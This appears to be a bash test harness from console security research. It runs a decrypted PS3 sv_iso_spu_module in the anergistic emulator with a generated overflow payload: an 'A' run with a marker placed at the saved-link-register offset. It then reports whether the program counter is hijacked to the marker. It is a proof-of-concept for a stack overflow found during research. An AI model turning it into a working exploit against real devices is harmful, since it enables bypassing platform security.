#!/bin/bash
# svtest -- drive sv_iso_spu_module from its real entry and report the final PC.
#
# Produced F-0071. The payload page is GENERATED here, not shipped: it is
# 16 KB of zeros with a 0x400-byte 'A' run and a 4-byte marker at +0xE0, the
# offset that lands on the saved link register.
#
#   usage: svtest.sh <version> <len-hex> <marker-hex>
#   e.g.   svtest.sh 4.20 E0 0003BEE0      -> clean, stop 0x010a
#          svtest.sh 4.20 E4 0003BEE0      -> hijacked, pc = marker
#
# Needs, supplied by you:
#   $PS3_CORPUS   directory of decrypted modules, <version>/sv_iso_spu_module.elf
#   $ANERGISTIC   the emulator binary (default: ../anergistic/anergistic)
set -u
V=${1:?version}; L=${2:?length-hex}; M=${3:?marker-hex}
CORPUS=${PS3_CORPUS:?set PS3_CORPUS to your decrypted-module directory}
ANERG=${ANERGISTIC:-$(dirname "$0")/../anergistic/anergistic}

# corpora are named both ways in the wild
# Try the layouts that exist in practice. Version is always PINNED -- the
# harness never falls back to a different version's module.
ELF=""
for cand in "$CORPUS/$V/sv_iso_spu_module.elf" \
            "$CORPUS/${V//./}/sv_iso_spu_module.elf" \
            "$CORPUS/corpus/$V/sv_iso_spu_module.elf" \
            "$CORPUS/corpus/${V//./}/sv_iso_spu_module.elf"; do
  [ -f "$cand" ] && { ELF="$cand"; break; }
done
[ -n "$ELF" ] || { echo "svtest: no sv_iso_spu_module.elf for version $V under $CORPUS (refusing to substitute another version)" >&2; exit 2; }
[ -x "$ANERG" ] || { echo "svtest: no anergistic at $ANERG (make -C anergistic)" >&2; exit 2; }

EA=$(mktemp -t svtest-ea.XXXXXX)
trap 'rm -f "$EA"' EXIT
python3 - "$M" "$EA" <<'PY'
import struct, sys
ea = bytearray(0x4000)
buf = bytearray(b'A' * 0x400)
struct.pack_into('>I', buf, 0xE0, int(sys.argv[1], 16))   # the saved-LR slot
ea[0x1000:0x1000 + len(buf)] = buf
open(sys.argv[2], 'wb').write(ea)
PY

ANERG_EA="$EA" "$ANERG" \
  -r 3=0 -r 4=0:1000:0:0 -r 5=0:1000:0:0 -r 6=0:$L:0:0 \
  -r 7=0 -r 8=0 -r 9=0 -r 10=0 -r 11=0 -m 400000 \
  "$ELF" 2>&1 | grep -E "^ pc:|stop instruction" | tr '\n' ' '
echo "   <= ver=$V len=0x$L marker=0x$M"
